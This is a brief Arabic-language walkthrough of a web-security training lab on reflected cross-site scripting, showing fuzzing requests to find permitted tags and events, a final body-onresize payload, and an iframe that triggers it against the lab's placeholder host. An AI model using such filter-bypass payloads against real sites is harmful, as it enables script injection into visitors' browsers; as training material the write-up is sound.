# Lab: Reflected XSS into HTML context with most tags and attributes blocked

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

- الفكره من الLab ده انك عاوز تحقن كود XSS بس انت الموقع بيعمل block لكل tags فا احنا المفروض نعرف التاج الصح و الpayloads الصح

```bash
1. GET /?search=<$$> HTTP/2 ==> علشان اعرف نهو الي هيمشي معايا  Tags هجرب كل ال

2. GET /?search=<body%20$$=1> HTTP/2 ==> الصح الي هيشتغل معايا Eventالصح المفروض نعرف دالوقتي ال Tagكدا عرفنا ال

3. %22%3E%3Cbody%20onresize=print()%3E ==> النهائي Payloadال

4. <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'> 
```
